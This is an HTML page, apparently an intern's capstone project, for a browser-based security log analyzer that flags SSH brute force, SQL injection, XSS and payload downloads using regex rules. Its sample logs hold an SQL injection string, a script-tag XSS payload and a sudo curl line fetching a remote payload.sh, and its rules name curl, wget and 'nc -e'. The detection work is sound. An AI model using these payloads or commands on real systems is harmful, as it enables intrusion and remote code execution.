<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SecGuard SIEM — Security Log Analyzer & Threat Dashboard</title>
  <style>
    * { box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
    body { background: #0f172a; color: #e2e8f0; margin: 0; padding: 24px; }
    .container { max-width: 1050px; margin: auto; }
    h1 { color: #38bdf8; margin-bottom: 4px; }
    p.sub { color: #94a3b8; margin-top: 0; }
    .grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 14px; margin: 20px 0; }
    .card { background: #1e293b; border: 1px solid #334155; border-radius: 10px; padding: 16px; }
    .card h3 { margin: 0; font-size: 13px; color: #94a3b8; text-transform: uppercase; }
    .card .num { font-size: 28px; font-weight: bold; margin-top: 6px; color: #f8fafc; }
    .crit { color: #f87171 !important; }
    .warn { color: #fbbf24 !important; }
    .ok { color: #34d399 !important; }
    textarea { width: 100%; height: 140px; background: #020617; color: #38bdf8; border: 1px solid #334155; border-radius: 8px; padding: 12px; font-family: monospace; font-size: 13px; }
    .btns { margin: 12px 0 20px; display: flex; gap: 10px; }
    button { background: #0284c7; color: white; border: none; padding: 10px 18px; border-radius: 6px; font-weight: 600; cursor: pointer; }
    button.sec { background: #334155; }
    button:hover { opacity: 0.9; }
    table { width: 100%; border-collapse: collapse; background: #1e293b; border-radius: 8px; overflow: hidden; }
    th, td { padding: 12px; text-align: left; border-bottom: 1px solid #334155; font-size: 14px; }
    th { background: #020617; color: #38bdf8; }
    .badge { padding: 3px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
    .HIGH { background: #7f1d1d; color: #fecaca; }
    .MEDIUM { background: #78350f; color: #fde68a; }
    .LOW { background: #064e3b; color: #a7f3d0; }
  </style>
</head>
<body>
  <div class="container">
    <h1>SecGuard SIEM — Log Analyzer &amp; Threat Dashboard</h1>
    <p class="sub">Capstone Project | Intern: Akshat Dave | Codomax Cybersecurity Track</p>

    <div class="grid">
      <div class="card"><h3>Total Events Parsed</h3><div class="num" id="totalCount">0</div></div>
      <div class="card"><h3>High / Critical Alerts</h3><div class="num crit" id="highCount">0</div></div>
      <div class="card"><h3>Suspicious IPs</h3><div class="num warn" id="ipCount">0</div></div>
      <div class="card"><h3>System Status</h3><div class="num ok" id="sysStatus">ACTIVE</div></div>
    </div>

    <label for="logInput"><strong>Paste Server / Auth / Web Logs Below:</strong></label>
    <textarea id="logInput"></textarea>
    <div class="btns">
      <button type="button" id="analyzeBtn">Analyze Logs</button>
      <button type="button" class="sec" id="sampleBtn">Load Sample Attack Logs</button>
    </div>

    <table>
      <thead>
        <tr>
          <th>Severity</th>
          <th>Detected Threat</th>
          <th>Source IP</th>
          <th>Evidence Snippet</th>
          <th>Recommended Mitigation</th>
        </tr>
      </thead>
      <tbody id="resultsBody"></tbody>
    </table>
  </div>

  <script>
    const sampleData = [
      "Nov 16 02:14:03 srv01 sshd[4102]: Failed password for invalid user admin from 203.0.113.45 port 51822 ssh2",
      "Nov 16 02:14:11 srv01 sshd[4105]: Failed password for root from 203.0.113.45 port 51830 ssh2",
      "Nov 16 02:14:19 srv01 sshd[4109]: Failed password for deploy from 203.0.113.45 port 51904 ssh2",
      "Nov 16 02:16:05 web01 nginx: 198.51.100.22 GET /login.php?user=admin' OR '1'='1' -- 200",
      "Nov 16 02:18:42 web01 nginx: 192.0.2.77 GET /search?q=<script>alert(1)<\/script> 200",
      "Nov 16 02:21:10 srv01 sudo: deploy : USER=root ; COMMAND=/usr/bin/curl http://198.51.100.88/payload.sh",
      "Nov 16 02:25:00 srv01 systemd[1]: Started Daily apt download activities."
    ].join("\n");

    const rules = [
      { regex: /Failed password/i, sev: "HIGH", name: "SSH Brute-Force Attempt", fix: "Block source IP via firewall ACL and enforce SSH key-only auth." },
      { regex: /(' OR '|UNION SELECT|--)/i, sev: "HIGH", name: "SQL Injection Probe", fix: "Enforce parameterized queries and enable WAF SQLi rules." },
      { regex: /(<script>|javascript:|onerror=)/i, sev: "MEDIUM", name: "Reflected XSS Payload", fix: "Apply HTML output encoding and strict Content-Security-Policy." },
      { regex: /(sudo:.*curl|wget|nc -e)/i, sev: "HIGH", name: "Unauthorized C2 / Payload Download", fix: "Isolate host via EDR, kill process, and audit sudoers." }
    ];

    function appendRow(tbody, sev, threat, ip, line, fix) {
      const tr = document.createElement("tr");

      const sevTd = document.createElement("td");
      const badge = document.createElement("span");
      badge.className = `badge ${sev}`;
      badge.textContent = sev;
      sevTd.appendChild(badge);

      const threatTd = document.createElement("td");
      const strong = document.createElement("strong");
      strong.textContent = threat;
      threatTd.appendChild(strong);

      const ipTd = document.createElement("td");
      ipTd.textContent = ip;

      const codeTd = document.createElement("td");
      const code = document.createElement("code");
      code.textContent = line;
      codeTd.appendChild(code);

      const fixTd = document.createElement("td");
      fixTd.textContent = fix;

      tr.append(sevTd, threatTd, ipTd, codeTd, fixTd);
      tbody.appendChild(tr);
    }

    function analyzeLogs() {
      const lines = document.getElementById("logInput").value.split("\n").filter(l => l.trim());
      const tbody = document.getElementById("resultsBody");
      tbody.innerHTML = "";
      let high = 0;
      const ips = new Set();

      lines.forEach(line => {
        const ipMatch = line.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/);
        const ip = ipMatch ? ipMatch[0] : "Internal/Local";
        let matched = false;

        rules.forEach(rule => {
          if (rule.regex.test(line)) {
            matched = true;
            if (rule.sev === "HIGH") high++;
            if (ipMatch) ips.add(ip);
            appendRow(tbody, rule.sev, rule.name, ip, line, rule.fix);
          }
        });

        if (!matched) {
          appendRow(tbody, "LOW", "Normal System Event", ip, line, "No immediate action required.");
        }
      });

      document.getElementById("totalCount").innerText = lines.length;
      document.getElementById("highCount").innerText = high;
      document.getElementById("ipCount").innerText = ips.size;
      const statusEl = document.getElementById("sysStatus");
      statusEl.innerText = high > 0 ? "ALERT" : "CLEAN";
      statusEl.className = high > 0 ? "num crit" : "num ok";
    }

    function loadSampleLogs() {
      document.getElementById("logInput").value = sampleData;
      analyzeLogs();
    }

    document.getElementById("analyzeBtn").addEventListener("click", analyzeLogs);
    document.getElementById("sampleBtn").addEventListener("click", loadSampleLogs);
    window.addEventListener("DOMContentLoaded", loadSampleLogs);
  </script>
</body>
</html>
